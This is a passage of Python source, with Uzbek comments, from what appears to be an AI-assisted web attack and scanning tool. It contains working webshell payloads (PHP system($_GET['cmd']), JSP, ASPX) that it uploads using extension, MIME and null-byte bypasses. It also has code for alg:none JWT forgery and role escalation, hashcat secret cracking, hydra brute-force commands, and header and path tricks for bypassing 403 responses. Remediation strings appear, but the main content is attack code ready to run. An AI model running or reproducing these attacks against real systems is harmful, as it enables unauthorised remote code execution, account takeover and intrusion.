        for _ in range(15):
            r = self.client.post(ep.url, data={"username": "test", "password": "wrongpass"})
            statuses.append(r["status"])
            time.sleep(0.1)
        if 429 not in statuses and 403 not in statuses:
            return Finding(
                owasp_id="A04", owasp_name="Insecure Design",
                title="No rate limiting on authentication endpoint",
                risk="High", confidence=80,
                url=ep.url, method="POST", param="rate_limit",
                payload="15 rapid requests",
                evidence=f"15 requests returned {set(statuses)} — no 429/block",
                baseline_diff="", tool_output=f"Statuses: {statuses}",
                request_raw=f"POST {ep.url} (×15)",
                response_raw=f"Status codes: {statuses}",
                exploit_cmd=f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {urllib.parse.urlparse(ep.url).netloc} http-post-form",
                remediation="Implement rate limiting / CAPTCHA on auth endpoints.",
            )
        return None

    def _jwt_analysis(self, ep: Endpoint) -> Optional[Finding]:
        jwt = self.client.session.jwt_token
        if not jwt:
            return None
        parts = jwt.split(".")
        if len(parts) < 2:
            return None
        try:
            hdr = json.loads(base64.b64decode(parts[0] + "==").decode("utf-8", errors="ignore"))
            alg = hdr.get("alg", "").upper()
            if alg in ("NONE", ""):
                return Finding(
                    owasp_id="A07", owasp_name="Identification and Authentication Failures",
                    title="JWT Algorithm: none — signature bypass",
                    risk="Critical", confidence=95,
                    url=ep.url, method="GET", param="header:Authorization",
                    payload=jwt[:40] + "...",
                    evidence=f"JWT algorithm is '{alg}' — no signature verification",
                    baseline_diff="", tool_output="",
                    request_raw=f"Authorization: Bearer {jwt[:60]}...", response_raw="",
                    exploit_cmd="python3 -c \"import base64,json; ...\"",
                    remediation="Never accept JWT with alg:none. Use RS256/ES256.",
                )
            if alg in ("HS256", "HS384", "HS512"):
                return Finding(
                    owasp_id="A07", owasp_name="Identification and Authentication Failures",
                    title=f"JWT uses symmetric {alg} — brute-forceable",
                    risk="Medium", confidence=65,
                    url=ep.url, method="GET", param="header:Authorization",
                    payload=alg,
                    evidence=f"Symmetric JWT ({alg}): secret can be brute-forced offline",
                    baseline_diff="", tool_output="",
                    request_raw=f"Authorization: Bearer {jwt[:60]}...", response_raw="",
                    exploit_cmd=f"hashcat -a 0 -m 16500 '{jwt}' /usr/share/wordlists/rockyou.txt",
                    remediation="Use asymmetric algorithms (RS256, ES256) for JWT signing.",
                )
        except Exception:
            pass
        return None

    def _ssl_check(self, ep: Endpoint) -> Optional[Finding]:
        host = urllib.parse.urlparse(ep.url).netloc.split(":")[0]
        if shutil.which("nmap"):
            r = _run_cmd(f"nmap -p 443 --script ssl-enum-ciphers,ssl-cert {host} -T4 --open", timeout=30)
            output = r.get("output", "")
            issues = []
            if "SSLv3" in output:   issues.append("SSLv3 enabled (POODLE)")
            if "TLSv1.0" in output: issues.append("TLS 1.0 enabled (deprecated)")
            if "RC4" in output or "DES" in output: issues.append("Weak cipher suite")
            if "EXPIRED" in output.upper(): issues.append("SSL certificate expired")
            if issues:
                return Finding(
                    owasp_id="A02", owasp_name="Cryptographic Failures",
                    title=f"SSL/TLS weakness ({len(issues)} issues)",
                    risk="High", confidence=85,
                    url=ep.url, method="GET", param="SSL/TLS", payload="",
                    evidence="; ".join(issues),
                    baseline_diff="", tool_output=output[:400],
                    request_raw=f"nmap ssl-enum-ciphers {host}",
                    response_raw=output[:400],
                    exploit_cmd=f"testssl.sh {host}",
                    remediation="Disable SSLv3/TLS1.0, remove weak ciphers.",
                )
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _fuzz_request(self, ep: Endpoint, param_key: str,
                      param_name: str, payload: str) -> dict:
        params = dict(ep.params)
        params[param_key] = payload
        if ep.method == "GET":
            parsed = urllib.parse.urlparse(ep.url)
            qs     = dict(urllib.parse.parse_qsl(parsed.query))
            qs[param_key.split(":")[-1]] = payload
            new_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
            return self.client.get(new_url)
        clean = {k.split(":")[-1]: v for k, v in params.items()
                 if not k.startswith("header:") and not k.startswith("path:")}
        if ep.body_type == "json":
            return self.client.post(ep.url, json_data=clean)
        return self.client.post(ep.url, data=clean)

    def _inject_fuzz(self, url: str, param_key: str, placeholder: str) -> str:
        param_name = param_key.split(":")[-1]
        parsed     = urllib.parse.urlparse(url)
        qs         = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param_name] = placeholder
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))

    def _rebuild_url(self, url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(url)
        qs     = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = value
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))

    def _get_relevant_params(self, ep: Endpoint, param_types: list) -> list:
        if not param_types:
            return []
        relevant = []
        for k in ep.params:
            prefix = k.split(":")[0]
            if prefix in param_types or any(t in prefix for t in param_types):
                relevant.append(k)
        for k in ep.params:
            if ":" not in k:
                relevant.append(k)
        return list(dict.fromkeys(relevant))

    def _get_quick_payloads(self, check_id: str) -> list:
        """
        Quick inline payload'lar — wordlist tool'dan TASHQARI,
        tez baseline diff tekshirish uchun ishlatiladi.
        Bu yerda ham fallback logikasi: agar tizimda wordlist bo'lsa
        wordlist ishlatiladi, aks holda bu kichik list.
        """
        return {
            "A03_sqli":  self.SQLI_QUICK,
            "A03_xss":   self.XSS_QUICK,
            "A03_lfi":   self.LFI_QUICK,
            "A03_cmdi":  self.CMDI_QUICK,
            "A10_ssrf":  self.SSRF_QUICK,
            "A03_ssti":  self.SSTI_QUICK,
        }.get(check_id, ["test", "1", "'", "<"])

    def _diff_is_interesting(self, diff: dict) -> bool:
        return (
            diff.get("status_changed") or
            diff.get("time_anomaly") or
            diff.get("new_errors") or
            diff.get("size_pct", 0) > 25
        )

    def _build_request_str(self, ep: Endpoint, param_key: str, payload: str) -> str:
        pname = param_key.split(":")[-1]
        if ep.method == "GET":
            return f"GET {ep.url}?{pname}={urllib.parse.quote(payload)} HTTP/1.1\nHost: {urllib.parse.urlparse(ep.url).netloc}"
        return f"POST {ep.url} HTTP/1.1\nHost: {urllib.parse.urlparse(ep.url).netloc}\nContent-Type: application/x-www-form-urlencoded\n\n{pname}={urllib.parse.quote(payload)}"

    def _print_finding(self, f: Finding):
        colors = {"Critical":"bold red","High":"red","Medium":"yellow","Low":"cyan","Info":"dim"}
        c = colors.get(f.risk, "white")
        console.print(f"  [{c}][{f.risk}][/{c}] [bold]{f.owasp_id} — {f.title}[/bold] [dim](conf: {f.confidence}%)[/dim]")
        if f.evidence:
            console.print(f"    [dim]Evidence: {f.evidence[:100]}[/dim]")


# ─────────────────────────────────────────────────────────────────────────────
# FILE UPLOAD ATTACKER — webshell upload + RCE confirmation
# ─────────────────────────────────────────────────────────────────────────────
class FileUploadAttacker:
    """
    Upload endpoint topilganda webshell yuklashga urinadi.
    AI bypass strategiyasini tanlaydi: extension, MIME, magic bytes, null byte.
    """
    SHELL_PHP  = "<?php system($_GET['cmd']); ?>"
    SHELL_JSP  = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
    SHELL_ASPX = '<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd","/c "+Request["cmd"])); %>'

    UPLOAD_PATHS = [
        "/uploads/","/upload/","/files/","/images/","/media/",
        "/static/uploads/","/assets/","/content/uploads/",
        "/wp-content/uploads/","/userfiles/","/data/",
    ]

    def __init__(self, client: HTTPClient, ai: AIEngine):
        self.client = client
        self.ai     = ai

    def attack(self, upload_url: str, tech: dict) -> List[Finding]:
        findings = []
        lang = tech.get("lang","php")

        shell_content = self.SHELL_PHP
        if lang == "java":   shell_content = self.SHELL_JSP
        if lang == "aspnet": shell_content = self.SHELL_ASPX

        # Bypass kombinatsiyalari
        variants = self._build_variants(lang, shell_content)

        for name, fname, content, mime in variants[:8]:
            shell_path = f"/tmp/{fname}"
            Path(shell_path).write_text(content)

            # curl bilan upload
            cmd = (f"curl -s -X POST -F 'file=@{shell_path};type={mime}' "
                   f"-F 'filename={fname}' '{upload_url}' -o /tmp/upload_resp.txt -w '%{{http_code}}'")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
            status_code = result.stdout.strip()[-3:]
            resp_body   = ""
            try: resp_body = Path("/tmp/upload_resp.txt").read_text()
            except: pass

            if status_code not in ("200","201") and "success" not in resp_body.lower():
                continue

            # Shell topish
            base = upload_url.split("/upload")[0].split("/file")[0]
            for test_path in self.UPLOAD_PATHS:
                for cmd_test in ["id", "whoami"]:
                    test_url = f"{base}{test_path}{fname}?cmd={cmd_test}"
                    r = self.client.get(test_url)
                    if r["status"] == 200 and ("uid=" in r["body"] or "root" in r["body"]):
                        findings.append(Finding(
                            owasp_id="A03", owasp_name="Injection",
                            title=f"File Upload RCE [{name}]: {upload_url}",
                            risk="Critical", confidence=97,
                            url=test_url, method="GET", param="file",
                            payload=fname,
                            evidence=f"RCE confirmed: {r['body'][:150]}",
                            baseline_diff="upload→execute",
                            tool_output=r["body"][:400],
                            request_raw=cmd,
                            response_raw=r["body"][:400],
                            exploit_cmd=f"curl '{base}{test_path}{fname}?cmd=id'",
                            remediation="Validate file type server-side. Store outside webroot. Rename on upload.",
                            confirmed=True, tool="upload_attack",
                        ))
                        console.print(f"  [bold red]🎯 RCE via upload [{name}]: {test_url}[/bold red]")
                        return findings
        return findings

    def _build_variants(self, lang: str, shell: str) -> list:
        """Extension/MIME bypass variantlari."""
        if lang == "php":
            return [
                ("php-direct",       "shell.php",       shell, "application/octet-stream"),
                ("php5",             "shell.php5",      shell, "image/jpeg"),
                ("phtml",            "shell.phtml",     shell, "image/png"),
                ("double-ext",       "shell.php.jpg",   shell, "image/jpeg"),
                ("null-byte",        "shell.php%00.jpg",shell, "image/jpeg"),
                ("uppercase",        "shell.PhP",       shell, "application/octet-stream"),
                ("phar",             "shell.phar",      shell, "application/octet-stream"),
                ("htaccess-addtype", ".htaccess",
                 "AddType application/x-httpd-php .jpg\n", "text/plain"),
            ]
        if lang == "java":
            return [
                ("jsp-direct",  "shell.jsp",  shell, "application/octet-stream"),
                ("jspx",        "shell.jspx", shell, "application/octet-stream"),
            ]
        return [
            ("aspx-direct", "shell.aspx", shell, "application/octet-stream"),
            ("asp",         "shell.asp",  shell, "application/octet-stream"),
        ]


# ─────────────────────────────────────────────────────────────────────────────
# JWT ATTACKER — alg:none + RS256→HS256 + hashcat crack
# ─────────────────────────────────────────────────────────────────────────────
class JWTAttacker:
    """
    JWT zaifliklarini tekshiradi:
    1. alg:none — imzosiz token qabul qilinadimi?
    2. RS256→HS256 confusion — public key bilan sign qilish
    3. hashcat — HS256 secret brute force
    4. Role escalation — payload'da role/admin maydonini o'zgartirish
    """
    def __init__(self, client: HTTPClient, oob: OOBClient):
        self.client = client
        self.oob    = oob

    def attack(self, jwt: str, endpoints: List[dict]) -> List[Finding]:
        findings = []
        if not jwt: return findings

        try:
            parts = jwt.split(".")
            if len(parts) != 3: return findings

            # Header decode
            hdr_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header  = json.loads(base64.b64decode(hdr_b64))
            alg     = header.get("alg","")

            # Payload decode
            pay_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.b64decode(pay_b64))

            console.print(f"  [dim]JWT alg={alg} | payload keys: {list(payload.keys())}[/dim]")

            # ── 1. alg:none attack ──────────────────────────────────────
            if alg.upper() != "NONE":
                none_hdr  = base64.b64encode(
                    json.dumps({"alg":"none","typ":"JWT"}).encode()
                ).rstrip(b"=").decode()
                none_jwt  = f"{none_hdr}.{parts[1]}."

                for ep in endpoints[:20]:
                    url = ep.get("url","") if isinstance(ep, dict) else ep.url
                    if not url: continue
                    r = self.client._request(url, "GET", headers={"Authorization": f"Bearer {none_jwt}"})
                    if r["status"] == 200 and len(r["body"]) > 100:
                        if not any(s in r["body"].lower() for s in ["login","unauthorized","invalid token"]):
                            findings.append(Finding(
                                owasp_id="A02", owasp_name="Cryptographic Failures",
                                title="JWT alg:none Attack — Token Forgery",
                                risk="Critical", confidence=95,
                                url=url, method="GET", param="Authorization",
                                payload=none_jwt[:100],
                                evidence="Server accepted JWT with alg:none — no signature verification",
                                baseline_diff="alg:HS256 → alg:none",
                                tool_output=r["body"][:300],
                                request_raw=f"GET {url}\nAuthorization: Bearer {none_jwt[:80]}...",
                                response_raw=r["body"][:300],
                                exploit_cmd=f"# Forge any payload:\npython3 -c \"import base64,json; h=base64.b64encode(json.dumps({{'alg':'none','typ':'JWT'}}).encode()).rstrip(b'=').decode(); p=base64.b64encode(json.dumps({{'role':'admin'}}).encode()).rstrip(b'=').decode(); print(f'{{h}}.{{p}}.') \"",
                                remediation="Explicitly whitelist allowed algorithms. Reject alg:none.",
                                confirmed=True, tool="jwt_attacker",
                            ))
                            console.print("  [bold red]🎯 JWT alg:none works![/bold red]")
                            break

            # ── 2. Role escalation (admin:true, role:"admin") ───────────
            escalated = dict(payload)
            changed   = False
            for key in ["role","group","type","privilege","level","is_admin","admin","superuser","user_type"]:
                if key in escalated:
                    old_val = escalated[key]
                    escalated[key] = "admin" if isinstance(old_val, str) else True
                    changed = True
                    console.print(f"  [dim]JWT escalation: {key}={old_val} → {escalated[key]}[/dim]")

            if changed and alg.upper() == "NONE":
                esc_pay = base64.b64encode(json.dumps(escalated).encode()).rstrip(b"=").decode()
                esc_jwt = f"{parts[0]}.{esc_pay}."
                for ep in endpoints[:15]:
                    url = ep.get("url","") if isinstance(ep, dict) else ep.url
                    if not url or "admin" not in url.lower(): continue
                    r = self.client._request(url, "GET", headers={"Authorization": f"Bearer {esc_jwt}"})
                    if r["status"] == 200 and len(r["body"]) > 200:
                        findings.append(Finding(
                            owasp_id="A01", owasp_name="Broken Access Control",
                            title="JWT Role Escalation: admin access via forged token",
                            risk="Critical", confidence=90,
                            url=url, method="GET", param="Authorization",
                            payload=esc_jwt[:100],
                            evidence=f"Admin endpoint accessible with forged role=admin token",
                            baseline_diff="role=user → role=admin",
                            tool_output=r["body"][:300],
                            request_raw=f"GET {url}\nAuthorization: Bearer {esc_jwt[:80]}...",
                            response_raw=r["body"][:300],
                            exploit_cmd=f"curl -H 'Authorization: Bearer {esc_jwt[:80]}...' '{url}'",
                            remediation="Validate role claims server-side. Use proper RBAC.",
                            confirmed=True, tool="jwt_attacker",
                        ))
                        console.print(f"  [bold red]🎯 JWT role escalation: {url}[/bold red]")
                        break

            # ── 3. hashcat brute force (HS256/HS384/HS512) ──────────────
            if alg.upper().startswith("HS") and shutil.which("hashcat"):
                # Common JWT secret wordlists
                wl_paths = [
                    "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
                    "/usr/share/seclists/Passwords/darkweb2017-top10000.txt",
                    "/usr/share/wordlists/rockyou.txt",
                    "/tmp/jwt_wordlist.txt",
                ]
                # Fallback minimal wordlist
                Path("/tmp/jwt_wordlist.txt").write_text(
                    "\n".join(["secret","password","admin","key","jwt","token",
                               "supersecret","mysecret","changeme","123456",
                               "secret123","admin123","flask-secret","django-secret"]))

                for wl in wl_paths:
                    if not Path(wl).exists(): continue
                    crack_out = "/tmp/jwt_cracked.txt"
                    r = subprocess.run(
                        f"hashcat -a 0 -m 16500 '{jwt}' '{wl}' --quiet -o '{crack_out}' --force",
                        shell=True, capture_output=True, text=True, timeout=90)
                    if Path(crack_out).exists():
                        cracked = Path(crack_out).read_text().strip()
                        if cracked and ":" in cracked:
                            secret = cracked.split(":")[-1]
                            findings.append(Finding(
                                owasp_id="A02", owasp_name="Cryptographic Failures",
                                title=f"JWT Weak Secret Cracked: '{secret}'",
                                risk="Critical", confidence=99,
                                url="", method="", param="jwt_secret",
                                payload=secret,
                                evidence=f"JWT HS256 secret cracked via wordlist: '{secret}'",
                                baseline_diff="unknown secret → cracked",
                                tool_output=cracked,
                                request_raw=f"hashcat -m 16500 {jwt[:50]}... '{wl}'",
                                response_raw=cracked,
                                exploit_cmd=f"# Forge admin token:\npython3 -c \"import jwt; print(jwt.encode({{'role':'admin','sub':'admin'}}, '{secret}', algorithm='HS256'))\"",
                                remediation="Use cryptographically secure random secret (256+ bits). Rotate immediately.",
                                confirmed=True, tool="hashcat",
                            ))
                            console.print(f"  [bold red]🎯 JWT secret cracked: '{secret}'[/bold red]")
                            break
                    break  # only try first available wordlist

        except Exception as e:
            console.print(f"  [dim]JWT attack error: {e}[/dim]")
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# WEBSOCKET TESTER — ws:// auth bypass · injection · role escalation
# ─────────────────────────────────────────────────────────────────────────────
class WebSocketTester:
    """
    WebSocket endpoint'larini test qiladi:
    1. Auth bypass — token yubormay ulanish
    2. Role escalation — {"role":"admin"} yuborish
    3. Injection — SQL/CMDi payloadlar
    4. Mass assignment
    """
    TEST_MESSAGES = [
        '{"action":"ping"}',
        '{"action":"admin","role":"admin"}',
        '{"type":"auth","token":""}',
        '{"role":"admin","action":"getUsers"}',
        '{"cmd":"id"}',
        '{"query":"SELECT * FROM users"}',
        '{"action":"whoami"}',
        '{"user_id":1,"role":"admin"}',
    ]

    def __init__(self, ai: AIEngine):
        self.ai = ai

    def test(self, ws_url: str) -> List[Finding]:
        findings = []
        try:
            import websocket as _ws
        except ImportError:
            console.print("  [dim]websocket-client not installed — skip WS test[/dim]")
            return findings

        try:
            received = []
            errors   = []

            def on_msg(ws, msg):
                received.append({"dir":"recv","msg":str(msg)[:500]})
            def on_err(ws, err):
                errors.append(str(err))

            ws = _ws.WebSocketApp(ws_url, on_message=on_msg, on_error=on_err)
            t  = threading.Thread(target=ws.run_forever, daemon=True)
            t.start()
            time.sleep(2)

            for msg in self.TEST_MESSAGES:
                try:
                    ws.send(msg)
                    received.append({"dir":"sent","msg":msg})
                    time.sleep(0.3)
                except Exception:
                    pass

            time.sleep(2)
            ws.close()

            if not received:
                return findings

            # AI tahlil
            prompt = f"""
WebSocket URL: {ws_url}
Messages (sent/received):
{json.dumps(received[:20], indent=2)}
Errors: {errors}

Check for:
1. No auth required to connect
2. Role escalation accepted (role:admin message worked)
3. Command injection in responses
4. Sensitive data exposure
5. Mass assignment

{{"vulnerable":false,"issues":[{{"type":"auth_bypass","severity":"High","evidence":"..."}}],"confidence":0}}
"""
            result = self.ai._call(prompt) or {}

            if result.get("vulnerable") and result.get("confidence",0) >= 50:
                for issue in result.get("issues",[]):
                    findings.append(Finding(
                        owasp_id="A01", owasp_name="Broken Access Control",
                        title=f"WebSocket {issue.get('type','vuln')}: {ws_url}",
                        risk=issue.get("severity","Medium"),
                        confidence=int(result.get("confidence",70)),
                        url=ws_url, method="WS", param="websocket_message",
                        payload=str(issue.get("evidence",""))[:200],
                        evidence=str(issue.get("evidence",""))[:300],
                        baseline_diff="ws_message_analysis",
                        tool_output=json.dumps(received[:10])[:400],
                        request_raw="\n".join(m["msg"] for m in received if m["dir"]=="sent"),
                        response_raw="\n".join(m["msg"] for m in received if m["dir"]=="recv")[:400],
                        exploit_cmd=f"wscat -c '{ws_url}'",
                        remediation="Validate authentication and authorization on every WebSocket message.",
                        tool="websocket_tester",
                    ))
        except Exception as e:
            console.print(f"  [dim]WebSocket error: {e}[/dim]")
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# NUCLEI RUNNER — CVE · misconfig · default-creds
# ─────────────────────────────────────────────────────────────────────────────
class NucleiRunner:
    """
    Tech stack ga mos Nuclei template'larini ishlatadi.
    WordPress → wordpress tags. Spring → spring tags. Etc.
    """
    OWASP_MAP = {
        "sqli":"A03","xss":"A03","lfi":"A03","rce":"A03","ssti":"A03",
        "ssrf":"A10","xxe":"A03","cmdi":"A03","idor":"A01","bac":"A01",
        "auth":"A07","cors":"A05","misconfig":"A05","exposure":"A05",
        "cve":"A06","default":"A07","takeover":"A01","jwt":"A02",
    }

    def run(self, target: str, tech: dict, session: SessionContext) -> List[Finding]:
        if not shutil.which("nuclei"):
            return []

        tags = ["cve","misconfig","exposure","default-login","takeover","tech"]
        if tech.get("cms") == "wordpress":   tags.append("wordpress")
        if tech.get("lang") == "php":        tags.append("php")
        if tech.get("framework") == "spring":tags.append("spring")
        if tech.get("framework") == "django":tags.append("django")
        if tech.get("server") == "apache":   tags.append("apache")
        if tech.get("server") == "nginx":    tags.append("nginx")
        if tech.get("db") == "mongodb":      tags.append("mongodb")

        # Auth headers
        auth_flags = ""
        if session.cookies:
            c = "; ".join(f"{k}={v}" for k,v in session.cookies.items())
            auth_flags += f" -H 'Cookie: {c}'"
        if session.jwt_token:
            auth_flags += f" -H 'Authorization: Bearer {session.jwt_token}'"

        out_file = "/tmp/nuclei_mega_out.txt"
        cmd = (f"nuclei -u '{target}' -tags '{','.join(tags)}' "
               f"-severity critical,high,medium -silent -timeout 8 "
               f"-o '{out_file}' {auth_flags}")

        subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=200)

        findings = []
        if not Path(out_file).exists(): return findings

        pat = re.compile(r'\[([^\]]+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(https?://\S+)(?:\s+\[([^\]]*)\])?')
        risk_map = {"critical":"Critical","high":"High","medium":"Medium","low":"Low","info":"Info"}

        for line in Path(out_file).read_text().splitlines():
            m = pat.search(line)
            if not m: continue
            tmpl_id = m.group(2)
            risk    = risk_map.get(m.group(3).lower(), "Medium")
            url     = m.group(4)
            match   = m.group(5) or ""
            owasp   = "A06"
            for kw, oid in self.OWASP_MAP.items():
                if kw in tmpl_id.lower():
                    owasp = oid; break

            findings.append(Finding(
                owasp_id=owasp, owasp_name={"A06":"Vulnerable Components","A03":"Injection","A05":"Security Misconfiguration","A01":"Broken Access Control","A07":"Auth Failures","A10":"SSRF","A02":"Cryptographic Failures"}.get(owasp,""),
                title=f"[Nuclei] {tmpl_id}",
                risk=risk, confidence=88 if risk in ("Critical","High") else 70,
                url=url, method="GET", param=tmpl_id,
                payload=match[:200],
                evidence=line.strip()[:300],
                baseline_diff="nuclei_template_match",
                tool_output=line.strip()[:300],
                request_raw=f"nuclei -u {url} -tags {','.join(tags)}",
                response_raw=match[:200],
                exploit_cmd=f"nuclei -u '{url}' -id '{tmpl_id}'",
                remediation=f"Fix {tmpl_id} vulnerability. Check nuclei template for remediation.",
                confirmed=risk in ("Critical","High"), tool="nuclei",
            ))
            console.print(f"  [bold red]🎯 Nuclei [{risk}] {tmpl_id[:60]}[/bold red]")
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# RECURSIVE 403 BYPASSER — 3 qatlam chuqur bypass
# ─────────────────────────────────────────────────────────────────────────────
class Recursive403Bypasser:
    """
    Muammo: /admin → 403, /admin/config → 403, /admin/config/template → 200
    V6.0 da bu TOPILMAYDI chunki inner fuzz faqat 200/201 saqlaydi.

    Bu sinfda:
    1. 403 URL topilsa → path/header/method bypass sinaydi
    2. Inner fuzz: 403 bo'lsa ham → queue ga qo'shadi (rekursiv!)
    3. Har qatlam uchun alohida fuzz
    4. Max 3 qatlam chuqurlik
    """
    PATH_VARIANTS = [
        lambda u: u + "/",
        lambda u: u + "%20",
        lambda u: u + "%09",
        lambda u: u + "/..",
        lambda u: u + "..;/",
        lambda u: u + "?",
        lambda u: u + "/*",
        lambda u: u.replace("/admin", "//admin") if "/admin" in u else u + "//",
        lambda u: re.sub(r'(/\w+)$', r'/.\1', u),
    ]
    HEADER_VARIANTS = [
        {"X-Forwarded-For":           "127.0.0.1"},
        {"X-Real-IP":                 "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP":          "127.0.0.1"},
        {"X-Forwarded-Host":          "localhost"},
        {"X-Host":                    "127.0.0.1"},
        {"Client-IP":                 "127.0.0.1"},
        {"True-Client-IP":            "127.0.0.1"},
        {"X-Original-URL":            "PLACEHOLDER"},
        {"X-Rewrite-URL":             "PLACEHOLDER"},
    ]

    def __init__(self, client: HTTPClient, ai: AIEngine, wl_selector: "AIWordlistSelector"):
        self.client      = client
        self.ai          = ai
        self.wl_selector = wl_selector
        self._visited    : Set[str] = set()

    def bypass(self, start_url: str, max_depth: int = 3) -> List[Finding]:
        findings   : List[Finding] = []
        # BFS queue: (url, depth)
        bfs_queue  = [(start_url, 0)]

        while bfs_queue:
            url, depth = bfs_queue.pop(0)
            if url in self._visited or depth > max_depth:
                continue
            self._visited.add(url)

            parsed = urllib.parse.urlparse(url)
            path   = parsed.path
            leaf   = path.rstrip("/").rsplit("/", 1)[-1] if path.rstrip("/") else ""
            is_file_like_path = bool(leaf and "." in leaf and not path.endswith("/"))

            # ── 1. Baseline ───────────────────────────────────────────
            bl      = self.client.get(url)
            bl_hash = hashlib.md5(bl["body"].encode()).hexdigest() if bl["body"] else ""

            def is_bypass(r: dict) -> bool:
                if r["status"] not in (200, 206): return False
                if not r["body"] or len(r["body"]) < 50: return False
                if hashlib.md5(r["body"].encode()).hexdigest() == bl_hash: return False
                login_kw = sum(1 for s in ["login","sign in","password","username"]
                               if s in r["body"].lower())
                return login_kw < 2

            # ── 2. Path variants ──────────────────────────────────────
            for variant_fn in self.PATH_VARIANTS:
                try:
                    test_url = variant_fn(url)
                except Exception:
                    continue
                r = self.client.get(test_url)
                if is_bypass(r):
                    suffix = test_url[len(url):]
                    findings.append(self._make_finding(
                        f"403 Bypass (path variant '{suffix}'): {path}",
                        test_url, path, f"suffix='{suffix}'",
                        f"curl -v '{test_url}'", r["body"][:300], depth))
                    console.print(f"  [bold red]  🎯 403→200 path bypass: {test_url}[/bold red]")

            # ── 3. Header variants ────────────────────────────────────
            for hdrs in self.HEADER_VARIANTS:
                h = {k: (path if v == "PLACEHOLDER" else v) for k,v in hdrs.items()}
                r = self.client._request(url, "GET", headers=h)
                if is_bypass(r):
                    hname = list(h.keys())[0]
                    findings.append(self._make_finding(
                        f"403 Bypass (header {hname}): {path}",
                        url, path, f"{hname}: {list(h.values())[0]}",
                        f"curl -H '{hname}: {list(h.values())[0]}' '{url}'",
                        r["body"][:300], depth))
                    console.print(f"  [bold red]  🎯 403→200 header bypass: {hname}[/bold red]")

            # ── 4. Method override ────────────────────────────────────
            for method in ("POST","PUT","PATCH","OPTIONS","HEAD"):
                r = self.client._request(url, method)
                if is_bypass(r):
                    findings.append(self._make_finding(
                        f"403 Bypass (method {method}): {path}",
                        url, path, f"HTTP Method: {method}",
                        f"curl -X {method} '{url}'",
                        r["body"][:300], depth))

            # ── 5. REKURSIV inner fuzz — BU V6.0 DA YO'Q! ─────────────
            # 403 bo'lgan child'lar ham queue ga qo'shiladi
            if depth < max_depth and not is_file_like_path and shutil.which("ffuf"):
                ctx = {"url":url,"param":"dir_fuzz","tech":"dirs","param_type":"dirs","server":""}
                wordlist = self.wl_selector.select("dirs", ctx)
                if wordlist and Path(wordlist).exists():
                    out_file = str(Path(tempfile.gettempdir()) / f"403inner_{hashlib.md5(url.encode()).hexdigest()[:8]}.json")
                    console.print(f"  [dim]  ↳ inner ffuf: {url}/FUZZ[/dim]")
                    try:
                        subprocess.run(
                            f"ffuf -u '{url}/FUZZ' -w '{wordlist}' "
                            f"-t 60 -timeout 8 -maxtime 45 -mc 200,201,301,302,403 "  # 403 ham!
                            f"-o '{out_file}' -of json -s",
                            shell=True, capture_output=True, timeout=60)
                    except subprocess.TimeoutExpired:
                        console.print(f"  [dim yellow]  ↳ inner ffuf timeout: {url}/FUZZ[/dim yellow]")

                    try:
                        data = json.loads(Path(out_file).read_text())
                        for item in data.get("results",[]):
                            child_url    = item.get("url","")
                            child_status = item.get("status",0)
                            if not child_url: continue

                            if child_status in (200, 201):
                                # To'g'ridan finding
                                findings.append(self._make_finding(
                                    f"Forbidden parent, accessible child: {child_url}",
                                    child_url, child_url, child_url,
                                    f"curl -v '{child_url}'", "", depth))
                                console.print(f"  [bold red]  🎯 403→child 200: {child_url}[/bold red]")

                            elif child_status == 403 and child_url not in self._visited:
                                # REKURSIV — 403 child ham queue ga!
                                bfs_queue.append((child_url, depth + 1))
                                console.print(f"  [dim]  ↳ 403 child queued (depth {depth+1}): {child_url}[/dim]")

                    except Exception:
                        pass

        return findings

    def _make_finding(self, title, url, path, payload, exploit, resp, depth) -> Finding:
        return Finding(
            owasp_id="A01", owasp_name="Broken Access Control",
            title=title, risk="High", confidence=88,
            url=url, method="GET", param="URL/Header",
            payload=payload[:200],
            evidence=f"HTTP 403 → 200 bypass at depth {depth}. Path: {path}",
            baseline_diff="403→200",
            tool_output=resp[:300],
            request_raw=f"GET {url}",
            response_raw=resp[:300],
            exploit_cmd=exploit,
            remediation="Enforce authorization at application layer for ALL child paths recursively.",
            confirmed=True, tool="recursive_403",
        )


# ─────────────────────────────────────────────────────────────────────────────
# FP FILTER
# ─────────────────────────────────────────────────────────────────────────────
class FPFilter:
    def __init__(self, ai: AIEngine, client: HTTPClient):
        self.ai     = ai
        self.client = client

    def filter(self, findings: list[Finding]) -> list[Finding]:
        passed = []
        for f in findings:
            if f.confirmed:
                passed.append(f)
                continue
            if self._quick_fp(f):
                f.fp_filtered = True
                if not f.suppression_reason:
                    f.suppression_reason = "Quick filter: no reproducible diff or response looks like generic blocking."
                continue
            fp_result = self.ai.fp_filter(f)
            if fp_result.get("is_fp"):
                f.fp_filtered = True
                f.suppression_reason = fp_result.get("reason", "") or "AI FP filter marked this as false positive."
                continue
            f.confidence = int(fp_result.get("adjusted_confidence", f.confidence))
            if f.confidence < MIN_CONFIDENCE:
                f.fp_filtered = True
                f.suppression_reason = f"Confidence dropped below threshold after FP filter: {f.confidence}% < {MIN_CONFIDENCE}%."
                continue
            if f.risk in ("Critical", "High") and not f.confirmed:
                verify = self.ai.verify_finding(f, self.client)
                f.confirmed = verify.get("confirmed", False)
                if verify.get("evidence"):
                    f.evidence += f" | VERIFIED: {verify['evidence'][:100]}"
            passed.append(f)
        return passed

    def _quick_fp(self, f: Finding) -> bool:
